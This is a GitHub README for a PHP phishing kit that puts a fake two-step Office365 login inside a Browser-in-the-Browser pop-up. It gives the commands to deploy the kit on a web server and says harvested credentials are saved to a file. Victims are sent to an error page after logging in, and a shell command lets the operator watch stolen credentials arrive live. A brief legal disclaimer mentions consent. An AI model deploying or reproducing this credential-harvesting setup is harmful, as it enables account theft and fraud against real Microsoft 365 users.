# Office365 Phishing - Browser in the Browser

This repo contains a fake two-part Office365 login implemented within a Browser-In-The-Browser attack window. It can be used on a web server that supports PHP files. Any entered credentials are saved in <i>/opt/O365-BITB/creds.txt</i>. After logging in, the victim is redirected to an Office365 error page. Follow steps below for a quick and easy setup.

<center>
<p align='center'>
<img alt='Email Page' src='http://165.227.79.102/img/bitb1.png?q=1' style='width:800px;'/>
</p>
</center>

Legal Disclaimer: Usage of this repo for attacking targets without prior consent is illegal. It is the end user's responsiblity to obey applicable local, state and federal laws. Developer assumes no liability for any misuse or damage caused by this repo.

### Get Started

Run the below commands in the <b>/var/www/html</b> folder of your web server.

```
git clone https://github.com/jakedmurphy1/O365-BITB.git
```

```
cd O365-BITB
```

```
chmod 666 creds.txt
```
Move the credentials file into a non-public folder:
```
mkdir /opt/O365-BITB && mv creds.txt /opt/O365-BITB/creds.txt
```

Then visit <i>/O365-BITB/index.html</i> in your browser and give it a try! Any gathered credentials will be stored in <i>/opt/O365-BITB/creds.txt</i>

### Watch Creds in Real Time

You can watch credentials appear in real-time with a little bash magic:
```
tail -f /opt/O365-BITB/creds.txt | while read line; do echo $line; sleep 3; done
```

### Sources
https://github.com/mrd0x/BITB
